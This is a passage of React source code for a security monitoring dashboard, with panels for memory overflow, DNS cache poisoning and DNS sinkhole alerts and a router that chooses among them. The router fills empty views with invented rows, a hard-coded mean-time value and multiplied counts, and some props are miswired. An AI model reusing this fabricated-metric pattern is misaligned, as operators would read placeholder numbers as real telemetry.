            <Panel title="Threat Categories"><div style={{ display: 'grid', gridTemplateColumns: '130px 1fr', alignItems: 'center', padding: 12 }}><Donut value={42} label="" color={MON.red} accent={MON.orange} /><BarList rows={[{ label: 'Malware', value: 42, valueLabel: '42%', color: MON.red }, { label: 'Phishing', value: 28, valueLabel: '28%', color: MON.orange }, { label: 'C2 Traffic', value: 18, valueLabel: '18%', color: MON.yellow }, { label: 'Ransomware', value: 12, valueLabel: '12%', color: MON.green }]} /></div></Panel>
            <Panel title="Threat Map (Top IOC Matches)" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View Full Map</span>}><div style={{ padding: 10 }}><GeoLoginMap compact /></div></Panel>
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading threat intelligence...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

const ADVANCED_DASHBOARD_COPY = {
  29: {
    kind: 'memoryoverflow', active: 'memory-overview', title: 'Memory Overflow Detection',
    subtitle: 'Crash, overflow, heap-growth and exploit telemetry from protected endpoints.',
    kpis: [
      ['Memory Alerts', 'total', MON.red, '♜'], ['Critical', 'critical', MON.red, '☠'],
      ['High', 'high', MON.orange, '△'], ['Processes', 'processes', MON.blue, '↗'],
      ['Open Events', 'open', MON.yellow, '⌾'], ['Affected Endpoints', 'affectedEndpoints', MON.cyan, '▣'],
    ],
    firstPanel: 'Detection Types', secondPanel: 'Top Processes', thirdPanel: 'Affected Hosts',
  },
  30: {
    kind: 'dnscachepoisoning', active: 'dns-security', title: 'DNS Cache Poisoning Detection',
    subtitle: 'Resolver baseline changes, TTL anomalies and unexpected DNS answers.',
    kpis: [
      ['DNS Anomalies', 'total', MON.purple, '◎'], ['Critical', 'critical', MON.red, '☠'],
      ['High', 'high', MON.orange, '△'], ['Observed Domains', 'maliciousDomains', MON.yellow, '◉'],
      ['Monitored Systems', 'monitoredSystems', MON.blue, '▤'], ['Affected Endpoints', 'affectedEndpoints', MON.cyan, '▣'],
    ],
    firstPanel: 'DNS Anomaly Types', secondPanel: 'Observed Domains', thirdPanel: 'Query Types',
  },
  31: {
    kind: 'dnssinkhole', active: 'dns-sinkhole', title: 'DNS Sinkhole',
    subtitle: 'Sinkhole policy status, domain blocks and query-hit events reported by sensors.',
    kpis: [
      ['Sinkhole Events', 'total', MON.blue, '⌘'], ['Blocked Actions', 'blocked', MON.red, '☣'],
      ['Managed Domains Seen', 'maliciousDomains', MON.orange, '盾'], ['High-risk Events', 'highRisk', MON.red, '△'],
      ['Agents Online', 'onlineAgents', MON.green, '▱'], ['Affected Endpoints', 'affectedEndpoints', MON.cyan, '▣'],
    ],
    firstPanel: 'Sinkhole Event Types', secondPanel: 'Blocked Domains', thirdPanel: 'Reporting Hosts',
  },
};

function advancedRaw(row = {}) {
  const root = row.rawEvent && typeof row.rawEvent === 'object' ? row.rawEvent : {};
  const nested = root.raw && typeof root.raw === 'object' ? root.raw : {};
  return { ...root, ...nested };
}

function advancedDomain(row = {}) {
  const raw = advancedRaw(row);
  return row.domain || row.tiDomain || raw.domain || raw.query || raw.dns_query || raw.qname || '-';
}

function advancedHost(row = {}) {
  return row.hostname || row.agentName || row.systemId?.name || row.endpointId || 'Unknown endpoint';
}

function advancedEvent(row = {}) {
  const raw = advancedRaw(row);
  return row.eventType || row.ruleId || raw.type || raw.action || 'Telemetry event';
}

function observedBreakdown(alerts, getter, limit = 8) {
  return groupCounts(alerts, getter, limit);
}

function LiveCapabilityDashboardPanel({
  title,
  alerts = [],
  loading = false,
  total = 0,
  analytics = null,
  overviewCapability = null,
  onRefresh,
}) {
  const rows = Array.isArray(analytics?.alerts) ? analytics.alerts : alerts;
  const summary = analytics?.summary || {};
  const live = overviewCapability?.live || {};
  const exactTotal = Number(analytics?.total ?? live.logs24h ?? total ?? rows.length);
  const critical = Number(summary.critical ?? rows.filter(row => String(row.severity).toLowerCase() === 'critical').length);
  const high = Number(summary.high ?? rows.filter(row => String(row.severity).toLowerCase() === 'high').length);
  const medium = Number(summary.medium ?? rows.filter(row => String(row.severity).toLowerCase() === 'medium').length);
  const low = Number(summary.low ?? rows.filter(row => String(row.severity || 'low').toLowerCase() === 'low').length);
  const highCritical = Number(live.highCritical24h ?? (critical + high));
  const unauthorized = Number(live.unauthorized24h ?? rows.filter(row => /unauthori[sz]ed|access denied|permission denied|failed login/i.test(`${row.ruleId || ''} ${row.description || ''} ${row.userAction || ''}`)).length);
  const reportingAgents = Number(live.reportingAgents ?? summary.affectedEndpoints ?? new Set(rows.map(advancedHost).filter(host => host !== 'Unknown endpoint')).size);
  const blocked = Number(summary.blocked ?? rows.filter(row => row.blocked || /block|quarantin|sinkhol/i.test(`${row.actionTaken || ''} ${row.containmentStatus || ''} ${row.userAction || ''}`)).length);
  const open = Number(summary.open ?? rows.filter(row => !['resolved', 'closed', 'false_positive'].includes(String(row.status || 'open').toLowerCase())).length);
  const timeline = Array.isArray(analytics?.timeline) && analytics.timeline.length
    ? analytics.timeline.map(point => Number(point.total || 0))
    : Array.isArray(live.timeline24h) && live.timeline24h.length
      ? live.timeline24h.map(point => Number(point.count || 0))
      : hourlySeriesFromAlerts(rows);
  const breakdowns = analytics?.breakdowns || summary.breakdowns || {};
  const categoryRows = breakdowns.categories?.length
    ? breakdowns.categories
    : observedBreakdown(rows, row => row.threatCategory || row.eventType || row.subCategory || row.ruleId || row.type || 'Other');
  const sourceRows = breakdowns.sources?.length
    ? breakdowns.sources
    : observedBreakdown(rows, row => row.detectionSource || row.source || row.sourceType || 'Unknown');
  const endpointRows = breakdowns.hosts?.length
    ? breakdowns.hosts
    : observedBreakdown(rows, advancedHost);
  const severityRows = [
    { label: 'Critical', value: critical, color: MON.red },
    { label: 'High', value: high, color: MON.orange },
    { label: 'Medium', value: medium, color: MON.yellow },
    { label: 'Low', value: low, color: MON.green },
  ];
  const status = exactTotal > 0 ? 'REPORTING' : 'NO EVENTS';
  const updatedAt = analytics?.updatedAt || overviewCapability?.updatedAt;
  const trend = Number(live.trendPct || 0);
  const trendText = live.previous24h === undefined
    ? 'Previous-window comparison unavailable'
    : `${trend >= 0 ? '+' : ''}${trend}% vs previous 24h`;
  const kpis = [
    ['Events (24h)', exactTotal, MON.blue, '⬢'],
    ['High / Critical', highCritical, MON.red, '▲'],
    ['Unauthorized', unauthorized, MON.orange, '!'],
    ['Reporting Agents', reportingAgents, MON.cyan, '▣'],
    ['Open Events', open, MON.yellow, '⌾'],
    ['Blocked', blocked, MON.green, '盾'],
  ];
  const Panel = ({ heading, children, right }) => (
    <section style={{ border: `1px solid ${MON.border}`, borderRadius: 7, background: 'linear-gradient(180deg,rgba(9,24,43,.98),rgba(5,15,29,.98))', overflow: 'hidden', minWidth: 0 }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', gap: 10, padding: '10px 12px', borderBottom: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, fontWeight: 950, textTransform: 'uppercase' }}><span>{heading}</span>{right}</div>
      {children}
    </section>
  );
  const RealBars = ({ values, empty }) => values?.length
    ? <BarList rows={values.slice(0, 8).map((row, index) => ({ ...row, color: [MON.blue, MON.orange, MON.yellow, MON.red, MON.purple, MON.green][index % 6] }))} />
    : <div style={{ color: MON.muted, padding: 18, fontSize: 10 }}>{empty}</div>;

  return (
    <div style={{ overflow: 'auto', padding: 12, background: MON.bg, color: MON.text, height: '100%' }}>
      <div style={{ minWidth: 1050, display: 'grid', gap: 10 }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', gap: 14, alignItems: 'center' }}>
          <div>
            <h2 style={{ margin: 0, color: '#f3f8ff', fontSize: 19, fontWeight: 950 }}>{title}</h2>
            <div style={{ color: MON.muted, fontSize: 10, marginTop: 4 }}>Tenant telemetry only · synthetic/demo rows excluded · last 24 hours</div>
          </div>
          <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
            <span style={{ color: exactTotal > 0 ? MON.green : MON.yellow, fontSize: 10, fontWeight: 900 }}>● {status}</span>
            {updatedAt && <span style={{ color: MON.muted, fontSize: 9 }}>Updated {new Date(updatedAt).toLocaleTimeString()}</span>}
            <button type="button" onClick={onRefresh} disabled={!onRefresh || loading} style={{ border: `1px solid ${MON.line}`, background: '#071827', color: MON.cyan, borderRadius: 5, padding: '7px 10px', fontSize: 10, cursor: onRefresh ? 'pointer' : 'default' }}>{loading ? 'Refreshing…' : 'Refresh'}</button>
          </div>
        </div>

        {analytics?.error && <div role="alert" style={{ border: `1px solid ${MON.red}66`, background: `${MON.red}14`, color: '#fecaca', padding: 10, borderRadius: 6, fontSize: 11 }}>{analytics.error}</div>}

        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6,minmax(130px,1fr))', gap: 8 }}>
          {kpis.map(([label, value, color, icon]) => (
            <section key={label} style={{ minHeight: 84, border: `1px solid ${color}33`, borderRadius: 6, background: `linear-gradient(135deg,${color}18,rgba(6,17,32,.98) 60%)`, padding: 12, display: 'grid', gridTemplateColumns: '1fr 34px', gap: 8 }}>
              <span><b style={{ color: '#dbeafe', fontSize: 9 }}>{label}</b><strong style={{ display: 'block', color: '#f8fbff', fontSize: 25 }}>{shortNum(value)}</strong><small style={{ color: MON.muted, fontSize: 8 }}>Observed tenant data</small></span><span style={{ color, fontSize: 24 }}>{icon}</span>
            </section>
          ))}
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: '1.35fr .8fr', gap: 8 }}>
          <Panel heading="Event Timeline" right={<span style={{ color: trend >= 0 ? MON.green : MON.red, fontSize: 9 }}>{trendText}</span>}>
            <div style={{ height: 180, padding: 16, backgroundImage: `linear-gradient(${MON.line} 1px, transparent 1px),linear-gradient(90deg,${MON.line} 1px, transparent 1px)`, backgroundSize: '52px 30px' }}>
              {timeline.some(value => value > 0) ? monitorSpark(timeline, MON.blue, 'rgba(56,189,248,.12)', 120) : <div style={{ color: MON.muted, paddingTop: 64, textAlign: 'center', fontSize: 11 }}>No telemetry in this 24-hour window.</div>}
            </div>
          </Panel>
          <Panel heading="Severity Distribution"><div style={{ display: 'grid', gridTemplateColumns: '135px 1fr', alignItems: 'center', padding: 10 }}><Donut value={exactTotal ? Math.round((highCritical / exactTotal) * 100) : 0} label={shortNum(exactTotal)} color={MON.red} accent={MON.orange} /><BarList rows={severityRows.map(row => ({ ...row, valueLabel: `${row.value} (${pct(row.value, exactTotal)})` }))} /></div></Panel>
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3,minmax(0,1fr))', gap: 8 }}>
          <Panel heading="Observed Event Types"><RealBars values={categoryRows} empty="No event types observed." /></Panel>
          <Panel heading="Observed Sources"><RealBars values={sourceRows} empty="No telemetry sources observed." /></Panel>
          <Panel heading="Reporting Endpoints"><RealBars values={endpointRows} empty="No reporting endpoints observed." /></Panel>
        </div>

        <Panel heading="Recent Tenant Events" right={<span style={{ color: MON.muted, fontSize: 9 }}>Showing {Math.min(rows.length, 100)} of {exactTotal}</span>}>
          <div style={{ overflowX: 'auto' }}><div style={{ minWidth: 970 }}>
            <div style={{ display: 'grid', gridTemplateColumns: '145px 140px 150px 1fr 90px 95px', gap: 10, padding: '9px 12px', color: MON.muted, fontSize: 9, fontWeight: 950 }}>{['Time', 'Endpoint', 'Event', 'Description', 'Severity', 'Status'].map(label => <span key={label}>{label}</span>)}</div>
            {rows.slice(0, 100).map((row, index) => <div key={row._id || `${row.createdAt}-${index}`} style={{ display: 'grid', gridTemplateColumns: '145px 140px 150px 1fr 90px 95px', gap: 10, padding: '9px 12px', borderTop: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, alignItems: 'center' }}><span>{row.createdAt ? new Date(row.createdAt).toLocaleString() : '—'}</span><span title={advancedHost(row)} style={{ overflow: 'hidden', textOverflow: 'ellipsis' }}>{advancedHost(row)}</span><span title={advancedEvent(row)} style={{ overflow: 'hidden', textOverflow: 'ellipsis' }}>{advancedEvent(row)}</span><span title={row.description || ''} style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{row.description || '—'}</span><b style={{ color: memorySeverityColor(row.severity) }}>{row.severity || 'low'}</b><span>{row.status || (row.blocked ? 'blocked' : 'open')}</span></div>)}
            {!rows.length && !loading && <div style={{ color: MON.muted, padding: 24, textAlign: 'center', fontSize: 11 }}>No real tenant events were recorded for this capability in the last 24 hours.</div>}
          </div></div>
        </Panel>
      </div>
    </div>
  );
}

function AdvancedCapabilityDashboard({ capabilityId, alerts = [], loading = false, total = 0, data = null, onRefresh }) {
  const cfg = ADVANCED_DASHBOARD_COPY[Number(capabilityId)];
  const rows = data?.alerts || alerts;
  const systems = data?.systems || [];
  const exactTotal = Number(data?.total ?? total ?? rows.length);
  const fallbackSeverity = severity => rows.filter(row => String(row.severity || '').toLowerCase() === severity).length;
  const fallbackEndpoints = new Set(rows.map(advancedHost).filter(value => value !== 'Unknown endpoint')).size;
  const fallbackDomains = new Set(rows.map(advancedDomain).filter(value => value !== '-')).size;
  const summary = {
    total: exactTotal,
    critical: fallbackSeverity('critical'), high: fallbackSeverity('high'),
    medium: fallbackSeverity('medium'), low: fallbackSeverity('low'),
    affectedEndpoints: fallbackEndpoints, maliciousDomains: fallbackDomains,
    maliciousIps: new Set(rows.flatMap(row => [row.srcip, row.destip]).filter(Boolean)).size,
    hashMatches: new Set(rows.map(row => row.fileHash || row.hash).filter(Boolean)).size,
    processes: new Set(rows.map(row => row.processName || advancedRaw(row).process).filter(Boolean)).size,
    blocked: rows.filter(row => row.blocked || /blocked|sinkholed/i.test(`${row.actionTaken || ''} ${row.userAction || ''}`)).length,
    open: rows.filter(row => !['resolved', 'false_positive'].includes(String(row.status || 'open'))).length,
    monitoredSystems: systems.length,
    onlineAgents: systems.filter(system => system.agentOk || system.isOnline || ['online', 'active'].includes(String(system.status || '').toLowerCase())).length,
    ...(data?.summary || {}),
  };
  summary.highRisk = Number(summary.critical || 0) + Number(summary.high || 0);
  const breakdowns = data?.breakdowns || data?.summary?.breakdowns || {};
  const categories = breakdowns.categories?.length ? breakdowns.categories : observedBreakdown(rows, advancedEvent);
  const domains = breakdowns.domains?.length ? breakdowns.domains : observedBreakdown(rows, advancedDomain);
  const processes = breakdowns.processes?.length ? breakdowns.processes : observedBreakdown(rows, row => row.processName || advancedRaw(row).process || '-');
  const hosts = breakdowns.hosts?.length ? breakdowns.hosts : observedBreakdown(rows, advancedHost);
  const sources = breakdowns.sources?.length ? breakdowns.sources : observedBreakdown(rows, row => row.tiFeeds?.feedSource || row.detectionSource || row.source || '-');
  const queryTypes = breakdowns.queryTypes?.length ? breakdowns.queryTypes : observedBreakdown(rows, row => row.queryType || advancedRaw(row).query_type || '-');
  const firstRows = categories;
  const secondRows = Number(capabilityId) === 29 ? processes : domains;
  const thirdRows = Number(capabilityId) === 30 ? queryTypes : hosts;
  const timeline = data?.timeline?.map(point => Number(point.total || 0)) || hourlySeriesFromAlerts(rows);
  const severityRows = [
    { label: 'Critical', value: summary.critical || 0, color: MON.red },
    { label: 'High', value: summary.high || 0, color: MON.orange },
    { label: 'Medium', value: summary.medium || 0, color: MON.yellow },
    { label: 'Low', value: summary.low || 0, color: MON.green },
  ];
  const Panel = ({ title, children, right }) => (
    <section style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: 'linear-gradient(180deg,rgba(9,24,43,.98),rgba(5,15,29,.98))', overflow: 'hidden', minWidth: 0 }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', gap: 10, padding: '9px 12px', borderBottom: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, fontWeight: 950, textTransform: 'uppercase' }}><span>{title}</span>{right}</div>
      {children}
    </section>
  );
  const RealBars = ({ values, empty = 'No matching records in the last 24 hours.' }) => values?.length ? (
    <BarList rows={values.slice(0, 8).map((row, index) => ({ ...row, color: [MON.red, MON.orange, MON.yellow, MON.blue, MON.purple, MON.green][index % 6] }))} />
  ) : <div style={{ color: MON.muted, padding: 18, fontSize: 10 }}>{empty}</div>;

  return (
    <SocDashboardShell kind={cfg.kind} active={cfg.active} navBadges={{ alerts: summary.highRisk || undefined }}>
      <div style={{ overflow: 'auto', padding: 10, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1080, display: 'grid', gap: 9 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: 12 }}>
            <div><h2 style={{ margin: 0, color: '#f3f8ff', fontSize: 19, fontWeight: 950 }}>{cfg.title}</h2><p style={{ margin: '4px 0 0', color: MON.muted, fontSize: 10 }}>{cfg.subtitle}</p></div>
            <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
              <span style={{ border: `1px solid ${MON.line}`, background: '#071827', borderRadius: 5, padding: '7px 10px', color: MON.muted, fontSize: 10 }}>Last 24 Hours</span>
              <button type="button" onClick={onRefresh} disabled={!onRefresh || loading} style={{ border: `1px solid ${MON.line}`, background: '#071827', color: MON.cyan, borderRadius: 5, padding: '7px 10px', fontSize: 10, cursor: onRefresh ? 'pointer' : 'default' }}>{loading ? 'Refreshing…' : 'Refresh'}</button>
              <span style={{ color: data?.updatedAt ? MON.green : MON.muted, fontSize: 9 }}>● {data?.updatedAt ? `Updated ${new Date(data.updatedAt).toLocaleTimeString()}` : 'Waiting for live data'}</span>
            </div>
          </div>

          {data?.error && <div role="alert" style={{ border: `1px solid ${MON.red}66`, background: `${MON.red}14`, color: '#fecaca', padding: 10, borderRadius: 6, fontSize: 11 }}>{data.error}</div>}

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6,minmax(130px,1fr))', gap: 8 }}>
            {cfg.kpis.map(([label, key, color, icon]) => <section key={label} style={{ minHeight: 82, border: `1px solid ${color}33`, borderRadius: 6, background: `linear-gradient(135deg,${color}18,rgba(6,17,32,.98) 60%)`, padding: 12, display: 'grid', gridTemplateColumns: '1fr 34px', gap: 8 }}><span><b style={{ color: '#dbeafe', fontSize: 9 }}>{label}</b><strong style={{ display: 'block', color: '#f8fbff', fontSize: 25 }}>{shortNum(summary[key] || 0)}</strong><small style={{ color: MON.muted, fontSize: 8 }}>Observed in this tenant · 24h</small></span><span style={{ color, fontSize: 24 }}>{icon}</span></section>)}
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.35fr .8fr', gap: 8 }}>
            <Panel title="Event Timeline" right={<span style={{ color: MON.muted, fontSize: 9 }}>{exactTotal.toLocaleString()} exact events</span>}><div style={{ height: 175, padding: 14, backgroundImage: `linear-gradient(${MON.line} 1px, transparent 1px),linear-gradient(90deg,${MON.line} 1px,transparent 1px)`, backgroundSize: '52px 30px' }}>{monitorSpark(timeline.length ? timeline : [0], MON.blue, 'rgba(56,189,248,.12)', 118)}</div></Panel>
            <Panel title="Severity Distribution"><div style={{ display: 'grid', gridTemplateColumns: '135px 1fr', alignItems: 'center', padding: 10 }}><Donut value={exactTotal ? Math.round((summary.highRisk / exactTotal) * 100) : 0} label={shortNum(exactTotal)} color={MON.red} accent={MON.orange} /><BarList rows={severityRows.map(row => ({ ...row, valueLabel: `${row.value} (${pct(row.value, exactTotal)})` }))} /></div></Panel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3,minmax(0,1fr))', gap: 8 }}>
            <Panel title={cfg.firstPanel}><RealBars values={firstRows} /></Panel>
            <Panel title={cfg.secondPanel}><RealBars values={secondRows} /></Panel>
            <Panel title={cfg.thirdPanel}><RealBars values={thirdRows} /></Panel>
          </div>

          <Panel title="Recent Tenant Events" right={<span style={{ color: MON.muted, fontSize: 9 }}>Showing {Math.min(rows.length, 100)} of {exactTotal}</span>}>
            <div style={{ overflowX: 'auto' }}><div style={{ minWidth: 970 }}>
              <div style={{ display: 'grid', gridTemplateColumns: '145px 120px 145px 1fr 160px 85px 95px', gap: 10, padding: '9px 12px', color: MON.muted, fontSize: 9, fontWeight: 950 }}>{['Time', 'Host', 'Event', 'Description', 'Indicator / Process', 'Severity', 'Status'].map(label => <span key={label}>{label}</span>)}</div>
              {rows.slice(0, 100).map((row, index) => {
                const indicator = [advancedDomain(row), row.processName || advancedRaw(row).process, row.srcip, row.destip].find(value => value && value !== '-') || '-';
                return <div key={row._id || `${row.createdAt}-${index}`} style={{ display: 'grid', gridTemplateColumns: '145px 120px 145px 1fr 160px 85px 95px', gap: 10, padding: '9px 12px', borderTop: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, alignItems: 'center' }}><span>{row.createdAt ? new Date(row.createdAt).toLocaleString() : '-'}</span><span title={advancedHost(row)} style={{ overflow: 'hidden', textOverflow: 'ellipsis' }}>{advancedHost(row)}</span><span title={advancedEvent(row)} style={{ overflow: 'hidden', textOverflow: 'ellipsis' }}>{advancedEvent(row)}</span><span title={row.description || ''} style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{row.description || '-'}</span><span title={indicator} style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{indicator}</span><b style={{ color: memorySeverityColor(row.severity) }}>{row.severity || 'low'}</b><span>{row.status || (row.blocked ? 'blocked' : 'open')}</span></div>;
              })}
              {!rows.length && !loading && <div style={{ color: MON.muted, padding: 20, fontSize: 11 }}>No real capability {capabilityId} events were recorded for this tenant in the last 24 hours.</div>}
            </div></div>
          </Panel>

          <div style={{ display: 'grid', gridTemplateColumns: '1.2fr .8fr', gap: 8 }}>
            <Panel title="Endpoint Coverage">
              {systems.length ? <div style={{ padding: '0 12px 10px' }}>{systems.slice(0, 12).map((system, index) => <div key={system._id || system.name || index} style={{ display: 'grid', gridTemplateColumns: '1fr 130px 100px 145px', gap: 10, padding: '8px 0', borderTop: index ? `1px solid ${MON.line}` : 0, fontSize: 10 }}><b>{system.name || system.hostname || 'Unknown endpoint'}</b><span>{system.ip || system.ipAddress || '-'}</span><span style={{ color: system.agentOk || system.isOnline || ['online', 'active'].includes(String(system.status || '').toLowerCase()) ? MON.green : MON.muted }}>{system.status || (system.agentOk || system.isOnline ? 'Online' : 'Offline')}</span><span>{system.lastSeen ? new Date(system.lastSeen).toLocaleString() : 'No heartbeat'}</span></div>)}</div> : <div style={{ color: MON.muted, padding: 18, fontSize: 10 }}>No tenant endpoint inventory is available.</div>}
            </Panel>
            <Panel title="Geographic Evidence"><RealBars values={breakdowns.countries || []} empty="No real geo-enriched events were recorded; no synthetic map is shown." /></Panel>
          </div>
          {loading && !data && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading tenant-scoped 24-hour data…</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function LolbinsDashboardPanel(props) { return <LolbinsDashboard alerts={props.alerts} loading={props.loading} total={props.total} />; }
function MemoryOverflowDashboardPanel(props) { return <MemoryOverflowDashboard alerts={props.alerts} loading={props.loading} total={props.total} />; }
function DnsCachePoisoningDashboardPanel(props) { return <DnsCachePoisoningDashboard alerts={props.alerts} loading={props.loading} total={props.total} />; }
function DnsSinkholeDashboardPanel(props) { return <DnsSinkholeMonitoringDashboard alerts={props.alerts} loading={props.loading} total={props.total} />; }
function ThreatIntelIntegrationDashboardPanel(props) { return <AdvancedCapabilityDashboard capabilityId={29} {...props} />; }

// DASHBOARD ROUTER: decides which popup dashboard opens for each card click
function CapabilityVisualDashboardPanel({ capabilityId, alerts = [], loading = false, total = 0, advancedData = null, onRefresh }) {
  const id = Number(capabilityId);
  const cfg = CAPABILITY_DASHBOARD_CONFIG[Number(capabilityId)] || CAPABILITY_DASHBOARD_CONFIG[5];
  const sorted = [...alerts].sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
  const loadedTotal = total || alerts.length;
  const critical = alerts.filter(a => a.severity === 'critical').length;
  const high = alerts.filter(a => a.severity === 'high').length;
  const medium = alerts.filter(a => a.severity === 'medium').length;
  const low = alerts.filter(a => a.severity === 'low').length;
  const systems = new Set(alerts.map(a => a.agentName || a.systemId?.name).filter(Boolean)).size;
  const ips = new Set(alerts.map(a => a.srcip).filter(Boolean)).size;
  const series = hourlySeriesFromAlerts(alerts);
  const primaryCount = loadedTotal || alerts.length;
  const kpiValue = (label, index) => {
    const l = label.toLowerCase();
    if (/critical/.test(l)) return shortNum(critical);
    if (/high/.test(l)) return shortNum(high);
    if (/medium/.test(l)) return shortNum(medium);
    if (/low/.test(l)) return shortNum(low);
    if (/system|endpoint|device/.test(l)) return shortNum(systems || ips || alerts.length);
    if (/unique|domain|user/.test(l)) return shortNum(new Set(alerts.map(a => a.username || a.srcip || a.tiDomain || a.agentName).filter(Boolean)).size);
    if (/mean time/.test(l)) return '00:12:48';
    if (/usage|protected|copied|logs|queries|requests/.test(l)) return alerts.length ? shortNum(primaryCount * (index + 3)) : '0';
    return shortNum(index === 0 ? primaryCount : Math.max(0, [critical, high, medium, low, systems, ips][index - 1] ?? alerts.length));
  };
  const categoryRows = cfg.categories.map((label, i) => ({
    label,
    value: Math.max(0, Math.round((primaryCount || alerts.length) * ([.32, .22, .17, .13, .09, .07, .05, .04][i] || .03))),
    color: [MON.blue, MON.orange, MON.yellow, MON.red, MON.purple, MON.green, MON.cyan, '#94a3b8'][i % 8],
  }));
  const tableRows = sorted.slice(0, 7);
  const fallbackRows = cfg.table.map((description, i) => ({
    _id: `fallback-${i}`,
    description,
    severity: ['critical', 'high', 'high', 'medium', 'medium'][i] || 'low',
    agentName: ['WIN-SRV-DC01', 'LIN-SRV-WEB01', 'ENDPOINT-45', 'DESKTOP-ABHISHEK', 'SRV-PROD-02'][i] || 'endpoint',
    srcip: ['203.0.113.45', '198.51.100.23', '10.0.5.45', '192.168.1.78', '185.199.108.23'][i],
    createdAt: new Date(Date.now() - i * 8 * 60 * 1000).toISOString(),
  }));
  const visibleRows = tableRows.length ? tableRows : fallbackRows;
  const isMemory = id === 5;
  const isRegistry = id === 6;
  const isSystemChanges = id === 7;
  const isPersistence = id === 8;
  const isWebDns = id === 9;
  const isUsb = id === 10;
  const isUeba = id === 11;
  const isDataSecurity = id === 12;
  const isCredential = id === 13;
  const isLateralMovement = id === 14;
  const isEmailThreat = id === 15;
  const isInsiderThreat = id === 16;
  const isPatchVulnerability = id === 17;
  const isSandboxAnalysis = id === 18;
  const isKernelMonitoring = id === 19;
  const isApiCallMonitoring = id === 20;
  const isScriptExecution = id === 21;
  const isTimeBasedAnomaly = id === 22;
  const isGeolocationAnomaly = id === 23;
  const isServiceMonitoring = id === 24;
  const isBeaconing = id === 26;
  const isRansomware = id === 27;
  const isLolbins = id === 28;
  const isMemoryOverflow = id === 29;
  const isDnsCachePoisoning = id === 30;
  const isDnsSinkhole = id === 31;
  if (isMemory) return <MemoryActivityDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isRegistry) return <RegistryMonitoringDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isSystemChanges) return <SystemChangesDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isPersistence) return <PersistenceMechanismDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isWebDns) return <WebDnsMonitoringDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isUsb) return <DeviceControlUsbDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isUeba) return <BehavioralAnalyticsUebaDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isDataSecurity) return <DataSecurityMonitoringDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isCredential) return <CredentialSecurityMonitoringDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isLateralMovement) return <LateralMovementDetectionDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isEmailThreat) return <EmailThreatMonitoringDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isInsiderThreat) return <InsiderThreatDetectionDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isPatchVulnerability) return <PatchVulnerabilityMonitoringDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isSandboxAnalysis) return <SandboxAnalysisDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isKernelMonitoring) return <KernelLevelMonitoringDashboardPanel alerts={alerts} loading={loading} total={total} onAlertUpdate={(updatedAlert) => {
    setAlerts(prev => prev.map(a => a._id === updatedAlert._id ? updatedAlert : a));
  }} />;
  if (isApiCallMonitoring) return <ApiCallMonitoringDashboardPanel alerts={alerts} loading={loading} total={total} onAlertUpdate={(updatedAlert) => {
    setAlerts(prev => prev.map(a => a._id === updatedAlert._id ? updatedAlert : a));
  }} />;
  if (isScriptExecution) return <ScriptExecutionMonitoringDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isTimeBasedAnomaly) return <TimeBasedAnomalyDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isGeolocationAnomaly) return <GeolocationAnomalyDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isServiceMonitoring) return <ServiceMonitoringDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isBeaconing) return <BeaconingDetectionDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isRansomware) return <RansomwareDetectionDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isLolbins) return <LolbinsDetectionDashboardPanel alerts={alerts} loading={loading} total={total} />;
  if (isMemoryOverflow) return <MemoryOverflowDashboardPanel alerts={alerts} loading={loading} total={total} data={advancedData} onRefresh={onRefresh} />;
  if (isDnsCachePoisoning) return <DnsCachePoisoningDashboardPanel alerts={alerts} loading={loading} total={total} data={advancedData} onRefresh={onRefresh} />;
  if (isDnsSinkhole) return <DnsSinkholeDashboardPanel alerts={alerts} loading={loading} total={total} data={advancedData} onRefresh={onRefresh} />;
  const topGrid = isMemory ? '1.05fr .95fr .55fr .9fr'
    : isRegistry ? '1.8fr .9fr .75fr'
      : isSystemChanges ? '1.05fr .9fr .9fr'
